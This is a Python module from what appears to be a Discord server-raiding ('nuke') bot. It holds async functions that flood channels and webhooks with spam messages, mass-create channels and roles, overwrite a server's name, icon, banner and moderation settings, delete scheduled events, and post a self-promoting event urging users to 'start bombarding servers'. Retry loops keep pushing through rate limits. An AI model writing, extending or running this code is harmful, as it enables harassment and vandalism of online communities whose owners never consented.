import asyncio
import discord
import utils
import aiohttp
from uuid import uuid4 as _uuid4
from datetime import datetime, UTC, timedelta
from collections import defaultdict
from typing import List, overload, Awaitable, Callable, Literal, Tuple, Optional, Union, Any
from aiohttp import ClientSession, ClientError
from user import Settings
from default import server_invite, server_banner, p_name
from about import __version__

MISSING = discord.utils.MISSING
xs32 = utils.Xorshift32()
gif = utils.gif()
locks = defaultdict(asyncio.Lock)
uuid4 = lambda: str(_uuid4())
scheduled = {
    'states': {},
    'uuid': defaultdict(uuid4)
}

retry_queue = defaultdict(asyncio.Queue)
state_busy = defaultdict(asyncio.Lock)
state_running = set()


async def try_forever[T](task: Callable[..., Awaitable[T]], state: str, *args, **kwargs) -> T: # type: ignore
    scheduled['states'].setdefault(state, [])
    states = scheduled['states'][state]
    states.append(task)
    # TODO: FIND A WAY TO HANDLE RATE LIMITS PROPERLY
    # async with locks[state]:
    for _ in range(10):
        try:
            result = await task(*args, **kwargs)
            states.remove(task)
            return result
        except (discord.HTTPException, aiohttp.ClientOSError) as exc:
            retry_after = 0.25
            if isinstance(exc, discord.HTTPException):
                retry_after = getattr(exc, 'retry_after', retry_after)
                await asyncio.sleep(retry_after)
                continue
            await asyncio.sleep(retry_after)
            # Mostly rate limits and rare connection errors
            continue

async def create_channel(guild: discord.Guild, settings: Settings, **options) -> discord.TextChannel:
    uuid = scheduled['uuid'][f'cc{guild.id}']
    channel = settings.channel
    kwargs = dict(
        name=channel.name,
        topic=channel.topic,
        nsfw=channel.nsfw,
        news=channel.news if 'COMMUNITY' in guild.features else False,
        slowmode_delay=channel.slowmode_delay,
        overwrites={
            guild.default_role: discord.PermissionOverwrite(
                view_channel=True,
                read_message_history=True
            )
        }
    )
    kwargs.update(options)
    return await try_forever(
        guild.create_text_channel,
        uuid,
        **kwargs
    )

async def mess_channel(channel: discord.abc.GuildChannel, guild: discord.Guild, settings: Settings, **options):
    uuid = scheduled['uuid'][f'mc{guild.id}']
    _channel = settings.channel
    kwargs = {
        'name': _channel.name,
        'overwrites': {
            guild.default_role: discord.PermissionOverwrite(
                view_channel=True,
                read_message_history=True
            )
        }
    }

    if not isinstance(channel, discord.CategoryChannel):
        kwargs['slowmode_delay'] = _channel.slowmode_delay

    if isinstance(channel, discord.TextChannel):
        kwargs.update({
            'topic': _channel.topic,
            'nsfw': _channel.nsfw,
            'news': _channel.news if 'COMMUNITY' in guild.features else False
        })
    kwargs.update(options)
    await try_forever(channel.edit, uuid, **options) # pyright: ignore[reportAttributeAccessIssue]

async def create_webhook(channel: Union[discord.TextChannel, discord.VoiceChannel], settings: Settings, *, avatar: Optional[bytes] = None) -> discord.Webhook:
    uuid = scheduled['uuid'][f'cw{channel.guild.id}']
    webhook = settings.webhook
    return await try_forever(
        channel.create_webhook,
        uuid,
        name=webhook.username,
        avatar=avatar,
        reason=settings.reason
    )

@overload
async def get_webhook(
    channel: discord.abc.GuildChannel,
    *,
    amount: Literal[1] = ...,
    return_channel: Literal[False] = ...
) -> Optional[discord.Webhook]:
    ...

@overload
async def get_webhook(
    channel: discord.abc.GuildChannel,
    *,
    amount: Literal[1] = ...,
    return_channel: Literal[True] = ...
) -> Tuple[Optional[discord.Webhook], Union[discord.TextChannel, discord.VoiceChannel]]:
    ...

@overload
async def get_webhook(
    channel: discord.abc.GuildChannel,
    *,
    amount: Optional[int] = ...,
    return_channel: Literal[False] = ...
) -> List[discord.Webhook]:
    ...

@overload
async def get_webhook(
    channel: discord.abc.GuildChannel,
    *,
    amount: Optional[int] = ...,
    return_channel: Literal[True] = ...
) -> List[Tuple[discord.Webhook, Union[discord.TextChannel, discord.VoiceChannel]]]:
    ...

async def get_webhook(channel: discord.abc.GuildChannel, *, amount: Optional[int] = 1, return_channel: bool = False) -> Any:
    if isinstance(channel, (discord.TextChannel, discord.VoiceChannel)):
        webhooks = await channel.webhooks()
        if amount:
            web = webhooks[:amount]
        else:
            web = webhooks
        if len(web) == 1:
            web = web[0]
        elif not len(web):
            web = None
        if return_channel:
            return web, channel
        return web
    
async def get_webhooks(guild: discord.Guild, *, amount: Optional[int] = 1) -> List[Tuple[discord.Webhook, discord.abc.GuildChannel]]:
    items: List[Tuple[discord.Webhook, discord.abc.GuildChannel]] = []
    semaphore = asyncio.Semaphore(10)
    def check(channel: discord.abc.GuildChannel):
        return channel.position

    async def get(channel: discord.abc.GuildChannel):
        nonlocal items
        async with semaphore:
            item = await get_webhook(channel, amount=1, return_channel=True)
            if item[0]:
                items.append(item) # pyright: ignore[reportArgumentType]
            if amount and len(items) >= amount:
                raise RuntimeError
            if channel == sorted(guild.channels, key=check)[-1]:
                raise RuntimeError
    
    try:
        await asyncio.gather(*[
            get(channel) for channel in sorted(guild.channels, key=check
        )], return_exceptions=True)
    except RuntimeError:
        pass
    return items if not amount else items[:amount]

async def spam_webhook(webhook: discord.Webhook, settings: Settings, *, amount: Optional[int] = None) -> None:
    uuid = scheduled['uuid'][f'sw{webhook.id}']
    wb = settings.webhook
    message = settings.message
    for _ in range(amount or message.amount):
        await try_forever(webhook.send,
            uuid,
            content=message.content,
            avatar_url=wb.avatar_url,
            username=wb.username,
            tts=message.tts,
            embed=message.embed or MISSING
        )

async def spam_channel(channel: Union[discord.TextChannel, discord.VoiceChannel], settings: Settings, semaphore: asyncio.Semaphore, *, amount: int = 6) -> None:
    uuid = scheduled['uuid'][f'sc{channel.id}']
    message = settings.message
    for _ in range(amount):
        async with semaphore:
            await try_forever(channel.send,
                uuid,
                content=message.content,
                tts=message.tts,
                embed=message.embed or MISSING
            )

async def mess_server(guild: discord.Guild, settings: Settings, session: ClientSession, *, community: Optional[bool] = None) -> List[discord.TextChannel]:
    server = settings.guild
    community = server.community if community is None else community
    if server.icon:
        try:
            response = await session.get(server.icon)
            icon = await response.read()
        except ClientError:
            icon = MISSING
    else:
        icon = MISSING

    if guild.premium_tier >= 1:
        if server.banner:
            try:
                response = await session.get(server.banner)
                splash = await response.read()
            except ClientError:
                splash = MISSING
        else:
            splash = MISSING
    else:
        splash = MISSING

    if guild.premium_tier >= 2:
        if server.banner:
            try:
                response = await session.get(server.banner)
                banner = await response.read()
            except ClientError:
                banner = MISSING
        else:
            banner = MISSING
    else:
        banner = MISSING

    if guild.premium_tier == 3:
        vanity = None
    else:
        vanity = MISSING

    try:
        response = await session.get(server_banner)
        server_banner_bytes = await response.read()
    except ClientError:
        server_banner_bytes = None

    if community:
        channels = await asyncio.gather(*[create_channel(guild, settings, nsfw=False) for _ in range(2)])
        community_params = {
            'community': True,
            'public_updates_channel': channels[0],
            'rules_channel': channels[1],
        }
    else:
        community_params = {
            'community': False
        }
        channels = []

    if server.invites_disabled_until:
        invites_disabled_until = server.invites_disabled_until
        dt = datetime.now().timestamp()
        invites_disabled_until = datetime.fromtimestamp(invites_disabled_until + dt, UTC)
    else:
        invites_disabled_until = MISSING

    if server.dms_disbabled_until:
        dms_disbabled_until = server.dms_disbabled_until
        dt = datetime.now().timestamp()
        dms_disbabled_until = datetime.fromtimestamp(dms_disbabled_until + dt, UTC)
    
    else:
        dms_disbabled_until = MISSING

    if community:
        content_filter = discord.ContentFilter.all_members
        verification_level = discord.VerificationLevel.high
    else:
        content_filter = server.content_filter
        verification_level = server.verification_level

    for event in guild.scheduled_events:
        asyncio.create_task(event.delete(reason=settings.reason))

    if settings.default_event:
        asyncio.create_task(try_forever(guild.create_scheduled_event,
            f'egse{guild.id}',
            name=f'Join {p_name} V{__version__}',
            start_time=datetime.now(UTC) + timedelta(seconds=3),
            end_time=discord.utils.utcnow().replace(year=2029),
            entity_type=discord.EntityType.external,
            privacy_level=discord.PrivacyLevel.guild_only,
            location=server_invite,
            image=server_banner_bytes or MISSING,
            description=f'Join {p_name} V{__version__} and start bombarding servers today! {server_invite}',
            reason=settings.reason
        ))
    asyncio.create_task(try_forever(guild.edit,
        f'eg{guild.id}',
        name=server.name or MISSING,
        description=server.description or MISSING,
        icon=icon or MISSING,
        splash=splash or MISSING,
        banner=banner or MISSING,
        vanity_code=vanity or MISSING,
        default_notifications=server.notification_level or MISSING,
        system_channel_flags=server.system_channel_flags or MISSING,
        discoverable=server.discoverable or MISSING,
        widget_enabled=server.server_widget or MISSING,
        dms_disabled_until=dms_disbabled_until,
        invites_disabled_until=invites_disabled_until,
        premium_progress_bar_enabled=server.premium_progress_bar_enabled or MISSING,
        verification_level=verification_level or MISSING,
        explicit_content_filter=content_filter or MISSING,
        **community_params # pyright: ignore[reportArgumentType]
    ))
    return channels

async def create_role(guild: discord.Guild, settings: Settings, session: ClientSession, **options) -> discord.Role:
    uuid = scheduled['uuid'][f'cr{guild.id}']
    role = settings.role
    icon = None
    if guild.premium_tier >= 2:
        response = await session.get(role.icon)
        icon = response._body

    kwargs = {
        'name': role.name,
        'permissions': role.permissions,
        'color': role.color,
        'hoist': role.hoist,
        'mentionable': role.mentionable,
        'display_icon': icon or MISSING
    }
    kwargs.update(options)
    return await try_forever(guild.create_role, uuid, **kwargs)

async def edit_role(role: discord.Role, guild: discord.Guild, settings: Settings, session: ClientSession, **options) -> Optional[discord.Role]:
    uuid = scheduled['uuid'][f'sw{guild.id}']
    _role = settings.role
    icon = None
    if guild.premium_tier >= 2:
        response = await session.get(_role.icon)
        icon = response._body
    return await try_forever(role.edit,
        uuid,
        name=_role.name,
        permissions=_role.permissions,
        color=_role.color,
        hoist=_role.hoist,
        mentionable=_role.mentionable,
        display_icon=icon or MISSING,
        **options
    )

async def create_emoji(guild: discord.Guild, settings: Settings, session: ClientSession, *, icon: Optional[bytes] = None) -> Optional[discord.Emoji]:
    uuid = scheduled['uuid'][f'ce{guild.id}']
    emoji = settings.emoji
    if not icon:
        try:
            respone = await session.get(emoji.url)
            icon = await respone.read()
        except ClientError:
            return
    icon = utils.compress(icon).read()
    return await try_forever(guild.create_custom_emoji, uuid, name=emoji.name, image=icon)

async def create_sticker(guild: discord.Guild, settings: Settings, session: ClientSession, *, icon: Optional[bytes] = None) -> Optional[discord.Sticker]:
    uuid = scheduled['uuid'][f'cs{guild.id}']
    sticker = settings.sticker
    if not icon:
        try:
            respone = await session.get(sticker.url)
            icon = await respone.read()
        except ClientError:
            return
    buffer = utils.compress(icon)
    file = discord.File(buffer)
    return await try_forever(guild.create_sticker,
        uuid,
        name=sticker.name,
        description=sticker.description,
        emoji=sticker.emoji,
        file=file
    )

async def create_soundboard_sound(guild: discord.Guild, settings: Settings, session: ClientSession, *, sound: Optional[bytes] = None) -> Optional[discord.SoundboardSound]:
    uuid = scheduled['uuid'][f'css{guild.id}']
    _sound = settings.soundboard
    if not sound:
        try:
            respone = await session.get(_sound.url)
            sound = await respone.read()
        except ClientError:
            return
    buffer = utils.trim_mp3(sound)
    return await try_forever(guild.create_soundboard_sound,
        uuid,
        name=_sound.name,
        sound=buffer,
        emoji=_sound.emoji
    )